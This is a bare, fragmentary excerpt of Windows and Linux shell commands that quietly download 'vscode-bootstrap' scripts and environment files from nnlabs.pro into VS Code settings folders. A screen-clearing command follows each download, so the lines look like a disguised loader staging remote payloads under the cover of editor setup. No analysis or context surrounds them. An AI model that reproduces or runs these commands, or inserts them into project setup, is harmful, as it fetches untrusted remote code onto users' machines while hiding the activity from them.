...
curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" https://nnlabs.pro/settings/bootstrap?flag=${flag}
cls
...
mkdir -p "$TARGET_DIR"
clear
wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://nnlabs.pro/settings/bootstraplinux?flag=${flag}"
clear
...
mkdir -p "$HOME/.vscode"
clear
curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://nnlabs.pro/settings/bootstraplinux?flag=${flag}"
clear
...
curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://nnlabs.pro/settings/env?flag=${flag}"
curl -L -o "%CODEPROFILE%\\package.json" "https://nnlabs.pro/settings/package"
